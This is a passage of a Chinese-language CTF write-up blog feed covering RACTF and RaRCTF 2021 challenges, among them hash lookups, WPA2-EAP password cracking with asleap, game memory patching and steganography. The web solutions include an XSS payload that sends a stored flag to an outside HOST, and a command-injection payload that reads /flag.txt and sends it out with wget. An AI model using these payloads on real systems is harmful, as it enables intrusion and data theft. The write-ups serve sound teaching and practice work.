class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xad</span><br><span class="line">252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111  xae</span><br><span class="line">021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96  xaf</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xag</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xah</span><br><span class="line">18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4  xai</span><br><span class="line">5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9  xaj</span><br><span class="line">0bfe935e70c321c7ca3afc75ce0d0ca2f98b5422e008bb31c00c6d7f1f1c0ad6  xak</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xal</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xam</span><br><span class="line">6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b  xan</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xao</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xap</span><br><span class="line">5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9  xaq</span><br><span class="line">4c94485e0c21ae6c41ce1dfe7b6bfaceea5ab68e40a2476f50208e526f506080  xar</span><br><span class="line">4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce  xas</span><br><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1  xat</span><br><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1  xau</span><br><span class="line">4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a  xav</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xaw</span><br><span class="line">3f79bb7b435b05321651daefd374cdc681dc06faa65e374e38337b88ca046dea  xax</span><br><span class="line">18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4  xay</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xaz</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xba</span><br><span class="line">148de9c5a7a44d19e56cd9ae1a554bf67847afb0c58f6e12fa29ac7ddfca9940  xbb</span><br><span class="line">acac86c0e609ca906f632b0e2dacccb2b77d22b0621f20ebece1a4835b93f6f0  xbc</span><br><span class="line">6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b  xbd</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xbe</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xbf</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xbg</span><br><span class="line">aaa9402664f1a41f40ebbc52c9993eb66aeb366602958fdfaa283b71e64db123  xbh</span><br><span class="line">ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb  xbi</span><br><span class="line">d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2  xbj</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://md5decrypt.net/">https://md5decrypt.net/</a></p></blockquote><p>使用在线的解密工具处理后可以得到如下包含 flag 的内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1 : r</span><br><span class="line">ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb : a</span><br><span class="line">2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6 : c</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t</span><br><span class="line">252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111 : f</span><br><span class="line">021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96 : &#123;</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t</span><br><span class="line">18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4 : d</span><br><span class="line">5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9 : 0</span><br><span class="line">0bfe935e70c321c7ca3afc75ce0d0ca2f98b5422e008bb31c00c6d7f1f1c0ad6 : u</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _</span><br><span class="line">6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b : 1</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _</span><br><span class="line">5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9 : 0</span><br><span class="line">4c94485e0c21ae6c41ce1dfe7b6bfaceea5ab68e40a2476f50208e526f506080 : v</span><br><span class="line">4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce : 3</span><br><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1 : r</span><br><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1 : r</span><br><span class="line">4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a : 4</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t</span><br><span class="line">3f79bb7b435b05321651daefd374cdc681dc06faa65e374e38337b88ca046dea : e</span><br><span class="line">18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4 : d</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s</span><br><span class="line">148de9c5a7a44d19e56cd9ae1a554bf67847afb0c58f6e12fa29ac7ddfca9940 : p</span><br><span class="line">acac86c0e609ca906f632b0e2dacccb2b77d22b0621f20ebece1a4835b93f6f0 : l</span><br><span class="line">6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b : 1</span><br><span class="line">e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t</span><br><span class="line">d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _</span><br><span class="line">043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s</span><br><span class="line">aaa9402664f1a41f40ebbc52c9993eb66aeb366602958fdfaa283b71e64db123 : h</span><br><span class="line">ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb : a</span><br><span class="line">d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2 : &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;std0ut_1s_0v3rr4ted_spl1t_sha&#125;</span><br></pre></td></tr></table></figure><h3 id="Call-amp-Response"><a href="#Call-amp-Response" class="headerlink" title="Call&amp;Response"></a>Call&amp;Response</h3><blockquote><p>Agent,</p><p>We’re working a major case. We’ve been called in to covertly investigate a foreign govt agency, the GDGS, by a private organisation. We’ve finished performing initial reconnaissance of the target building and it’s surrounding areas. We know they have a wireless network which they use to carry out live activities. Gaining access here would be substiantial. Problem is, they’ve somewhat competently secured it using WPA2 EAP-PEAP authentication which means gaining a packet capture of the handshake process is useless as the authentication exchange is carried out over a TLS 1.2 session. Nonetheless, we setup an access point with same ESSID as the target and managed to trick an employee’s device into attempting to connect to our AP. In the process, we’ve obtained an username and certain auth values. We’re not entirely sure what we need to do with them.</p><p>Can you take a look and help us recover the password?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:    PrinceAli</span><br><span class="line">c:    c3:ae:5e:f9:dc:0e:22:fb</span><br><span class="line">r:    6c:52:1e:52:72:cc:7a:cb:0e:99:5e:4e:1c:3f:ab:d0:bc:39:54:8e:b0:21:e4:d0</span><br></pre></td></tr></table></figure><p>Flag format is <code>ractf&#123;recovered_password&#125;</code>.</p></blockquote><p>根据给出的信息可以找出如下参考文章。</p><blockquote><p><a href="https://solstice.sh/ii-attacking-and-gaining-entry-to-wpa2-eap-wireless-networks/#:~:text=This%20data%20can%20be%20passed%20to%20asleap%20to%20obtain%20a%20valid%20set%20of%20RADIUS%20credentials">https://solstice.sh/ii-attacking-and-gaining-entry-to-wpa2-eap-wireless-networks/#:~:text=This%20data%20can%20be%20passed%20to%20asleap%20to%20obtain%20a%20valid%20set%20of%20RADIUS%20credentials</a>.</p></blockquote><p>使用文章中给出的格式和题目信息构造出如下指令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$asleap</span> -C c3:ae:5e:f9:dc:0e:22:fb -R 6c:52:1e:52:72:cc:7a:cb:0e:99:5e:4e:1c:3f:ab:d0:bc:39:54:8e:b0:21:e4:d0 -W 10-million-password-list-top-10000.txt</span><br></pre></td></tr></table></figure><p>运行指令可以得出如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asleap 2.2 - actively recover LEAP&#x2F;PPTP passwords. &lt;jwright@hasborg.com&gt;</span><br><span class="line">Using wordlist mode with &quot;10-million-password-list-top-10000.txt&quot;.</span><br><span class="line">        hash bytes:        8799</span><br><span class="line">        NT hash:           1cb292fbd610e825d02492ec8d8c8799</span><br><span class="line">        password:          rainbow6</span><br></pre></td></tr></table></figure><p>因此可以得出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;rainbow6&#125;</span><br></pre></td></tr></table></figure><h3 id="RSFPWS-Intercepted"><a href="#RSFPWS-Intercepted" class="headerlink" title="RSFPWS - Intercepted"></a>RSFPWS - Intercepted</h3><blockquote><p>This game i’m playing is fun! There’s this box that seemingly does nothing though… It sends a “network request” whatever that is. Can you have a look?</p><p>(When the game launches, enter the IP and port you get from above. This challenge uses the same files and instance as other RSFPWS challenges)</p></blockquote><p>按照题目信息进入游戏之后可以发现如下方块。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629274049432813/159081701df3f928ef111172b64463edd0315e45.png"></p><p>使用 WireShark 来抓取流量，控制游戏角色走入方块中，即可在 WireShark 中看到一个 TCP 流量包，其中包含如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;...........Welcome to the server!....................Lemon-...............Lemon.......@...................?...........*..............ractf&#123;N3tw0rking_L1ke_4_B0ss!&#125;</span><br></pre></td></tr></table></figure><p>可以发现其中包含着 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;N3tw0rking_L1ke_4_B0ss!&#125;</span><br></pre></td></tr></table></figure><h3 id="RSFPWS-Invulnerable"><a href="#RSFPWS-Invulnerable" class="headerlink" title="RSFPWS - Invulnerable"></a>RSFPWS - Invulnerable</h3><blockquote><p>This game i’m playing is fun! They have these cubes where you walk into them and take damage, how awesome! One of them instant kills you though, that kinda sucks. Can you solve that?</p><p>(When the game launches, enter the IP and port you get from above. This challenge uses the same files and instance as other RSFPWS challenges)</p></blockquote><p>进入游戏之后发现两个方块。一个是游戏角色 HP-5 而一个是直接将游戏角色 HP 变为 0。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629275544775010/4b1da8b0c7d07e8aa89c393a2739e1897946ff0a.png"></p><p>只需要用 Cheat Engine 找出存储了 HP 变量的位置，再附加调试后在游戏中尝试一次将游戏角色的 HP 减为 0 的方块，找出向其中写入值的函数并 NOP 掉即可在游戏角色 HP 被变为 0 之后使得游戏不被重置而看到 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629274765622333/5d0f9231957d53834c7154e710390cd5696aeb99.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629275027310019/afc410f5a95c43ae1bcc222f2b798f8ad63a0e6c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;Y0uB3tt3rN0tHav3De0bfusc4ted...&#125;</span><br></pre></td></tr></table></figure><h2 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h2><h3 id="The-Glory-Days"><a href="#The-Glory-Days" class="headerlink" title="The Glory Days"></a>The Glory Days</h3><blockquote><p>My friend sent me this audio file, I’m sure I recognise it but I think he’s tweaked it to hide a message somewhere. Can you take a look?</p></blockquote><p>附件是一个 Midi 文件，使用 Midi Editor 打开文件可在 Track 0 的位置发现摩斯电码。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629278284838741/6ec953331d6f392b0ae7ba1137c5d7688d1555f4.png"></p><p>将其抄写下来可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- .--- --.- .-- --. ..... -.. --. .--. -. --. -..- -.- ....- --.. .-. -- -. .--. ..- ..--- -- -.. ... -.- -. ... ...- -.... - .-.. ..-. --- -. .--- - .. --.. --.. - .--. ..- </span><br></pre></td></tr></table></figure><p>使用如下的 CyberChef Receipt 处理之后可得 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">From_Morse_Code(&#39;Space&#39;,&#39;Line feed&#39;)</span><br><span class="line">From_Base32(&#39;A-Z2-7&#x3D;&#39;,true)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;Mus1c_M0rSe_MesS4g3&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/ca87557c.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RaRCTF 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/837b9c99.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/837b9c99.html</guid>
      <pubDate>Wed, 11 Aug 2021 05:02:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;Fancy-Button-Generator&quot;&gt;&lt;a href=&quot;#Fancy-Button-Generator&quot; class=&quot;headerlink&quot; title=&quot;Fancy Button Generator&quot;&gt;&lt;/a&gt;Fancy Button Generator&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Check out this cool new fancy button generator! The buttons even</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Fancy-Button-Generator"><a href="#Fancy-Button-Generator" class="headerlink" title="Fancy Button Generator"></a>Fancy Button Generator</h3><blockquote><p>Check out this cool new fancy button generator! The buttons even glow!</p></blockquote><p>将给出的附件源码下载，可以很明显看出这是一个 XSS 的题目，同时使用了一个工作量证明（Proof Of Work）的验证机制。</p><blockquote><p>Proof of work: <a href="https://en.wikipedia.org/wiki/Proof_of_work">https://en.wikipedia.org/wiki/Proof_of_work</a></p></blockquote><p>题目的附件中给出了其计算方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    <span class="keyword">return</span> uuid.uuid4().<span class="built_in">hex</span>[:<span class="number">4</span>], uuid.uuid4().<span class="built_in">hex</span>[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">prefix, suffix, answer, difficulty=<span class="number">6</span></span>):</span></span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha256(prefix.encode() + answer.encode() + suffix.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hash</span>.endswith(<span class="string">&quot;0&quot;</span> * difficulty)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">prefix, suffix, difficulty</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        test = binascii.hexlify(os.urandom(<span class="number">4</span>)).decode()</span><br><span class="line">        <span class="keyword">if</span> verify(prefix, suffix, test, difficulty):</span><br><span class="line">            <span class="keyword">return</span> test</span><br></pre></td></tr></table></figure><p>因此只需要先请求获得前缀和后缀，Solve 完成之后提交数据即可获得一次发送按钮的权力。再来看 admin 是如何操作按钮的，在给出的附件中有如下代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.evaluate(<span class="function"><span class="params">flag</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">localStorage</span>.flag = flag;</span><br><span class="line">    &#125;, process.env.FLAG);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> url = process.env.SITE + <span class="string">&quot;button?title=&quot;</span> + req.title + <span class="string">&quot;&amp;link=&quot;</span> + req.link;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Going to &quot;</span>, url);</span><br><span class="line">    <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">        waitUntil: <span class="string">&quot;networkidle2&quot;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> page.click(<span class="string">&quot;#btn&quot;</span>);</span><br><span class="line">    <span class="keyword">await</span> page.waitForTimeout(TIMEOUT);</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    page = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>很容易发现 admin 其实是直接点击了按钮，然后等了一下就关闭了页面。那么此时只需要对按钮进行 XSS 即可。使用 <code>javascript:alert(1)</code> 可以达成点击按钮后弹窗的效果。因此可以在 GET 参数 link 处进行 XSS 来尝试取出 localStorage.flag 然后发起一次对外的请求来获取 flag。构造出如下脚本来进行 XSS。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">session = requests.session()</span><br><span class="line">host = <span class="string">&quot;https://fbg.rars.win/&quot;</span></span><br><span class="line">data = session.get(host + <span class="string">&quot;pow&quot;</span>).json()</span><br><span class="line">solution = solve(data[<span class="string">&#x27;pref&#x27;</span>], data[<span class="string">&#x27;suff&#x27;</span>], <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Solved POW: <span class="subst">&#123;solution&#125;</span> with prefix <span class="subst">&#123;data[<span class="string">&#x27;pref&#x27;</span>]&#125;</span> suffix <span class="subst">&#123;data[<span class="string">&#x27;suff&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">session.post(host + <span class="string">&quot;pow&quot;</span>, json=&#123;<span class="string">&quot;answer&quot;</span>: solution&#125;)</span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line">link = <span class="string">&quot;javascript:window.location.replace(&#x27;http://HOST/?flagis-&#x27;%252BlocalStorage.getItem(&#x27;flag&#x27;))&quot;</span></span><br><span class="line">response = session.get(host + <span class="string">f&quot;admin?title=<span class="subst">&#123;name&#125;</span>&amp;link=<span class="subst">&#123;link&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>运行脚本即可在端口监听处得到如下请求数据，从而可以得到 flag。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flagis-rarctf&#123;th0s3_f4ncy_butt0n5_w3r3_t00_cl1ck4bl3_f0r_u5_a4667cb69f&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8.136.8.210:3255</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.107 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;th0s3_f4ncy_butt0n5_w3r3_t00_cl1ck4bl3_f0r_u5_a4667cb69f&#125;</span><br></pre></td></tr></table></figure><h3 id="lemonthinker"><a href="#lemonthinker" class="headerlink" title="lemonthinker"></a>lemonthinker</h3><blockquote><p>generate your lemonthinks here!</p><p>Note: All characters that look like a <code>O</code> are actually a <code>0</code>, please  try replacing all <code>O</code>‘s with  <code>0</code>‘s if you find that your flag does not work.</p></blockquote><p>题目给出的源代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time <span class="comment"># lemonthink</span></span><br><span class="line"></span><br><span class="line">clean = time.time()</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">chars = <span class="built_in">list</span>(string.ascii_letters + string.digits)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;index.html&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/generate&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">global</span> clean</span><br><span class="line">    <span class="keyword">if</span> time.time() - clean &gt; <span class="number">60</span>:</span><br><span class="line">      os.system(<span class="string">&quot;rm static/images/*&quot;</span>)</span><br><span class="line">      clean = time.time()</span><br><span class="line">    text = request.form.getlist(<span class="string">&#x27;text&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    text = text.replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filename = <span class="string">&quot;&quot;</span>.join(random.choices(chars,k=<span class="number">8</span>)) + <span class="string">&quot;.png&quot;</span></span><br><span class="line">    os.system(<span class="string">f&quot;python3 generate.py <span class="subst">&#123;filename&#125;</span> \&quot;<span class="subst">&#123;text&#125;</span>\&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;images/&#x27;</span> + filename), code=<span class="number">301</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">1002</span>)</span><br></pre></td></tr></table></figure><p>此时可以看出有一个参数可控，只需要传入 text 即可进行 RCE。构造出如下载荷读取文件 /flag.txt 并使用 wget 带出，靶机似乎没有 curl。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(cat /flag.txt | xargs -I&#123;&#125; wget <span class="string">&quot;http://HOST/?flagis-&#123;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>载荷发送后在监听端可以得到如下请求数据，即得到 flag。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flagis-rarctf&#123;b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8.136.8.210:3255</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Wget</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf&#125;</span><br></pre></td></tr></table></figure><h3 id="Secure-Uploader"><a href="#Secure-Uploader" class="headerlink" title="Secure Uploader"></a>Secure 